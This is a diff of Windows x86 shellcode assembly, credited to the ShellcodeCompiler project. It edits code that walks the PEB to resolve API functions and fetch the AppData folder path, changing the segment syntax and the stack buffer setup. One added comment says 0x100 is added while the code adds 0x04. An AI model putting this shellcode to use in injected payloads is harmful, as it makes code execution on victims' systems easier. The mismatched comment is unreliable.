@@ -2,7 +2,7 @@
 ; https://github.com/NytroRST/ShellcodeCompiler
 
 xor ecx, ecx
-mov eax, fs:[ecx + 0x30]               ; EAX = PEB
+mov eax, [fs:ecx + 0x30]               ; EAX = PEB
 mov eax, [eax + 0xc]                   ; EAX = PEB->Ldr
 mov esi, [eax + 0x14]                  ; ESI = PEB->Ldr.InMemOrder
 lodsd                                  ; EAX = Second module
@@ -87,10 +87,12 @@ push esp                               ; String on the stack
 push dword [esp + 32]
 call [esp + 32]
 add esp, 12
-push eax                               ; Function address on the stack
 
-sub esp, 0xFFE                          ; Allocate memory on the stack
-push esp                                ; Buffer on the stack
+sub esp, 0xFC                          ; Allocate memory on the stack
+push eax                               ; Function address on the stack
+; load the memory address of register esp and add 0x100 to it, then push it on the stack
+lea eax, [esp + 0x04]
+push eax
 xor eax, eax                            ; EAX = 0
 push eax                                ; NULL on the stack
 push 0x1d                               ; CSIDL_APPDATA
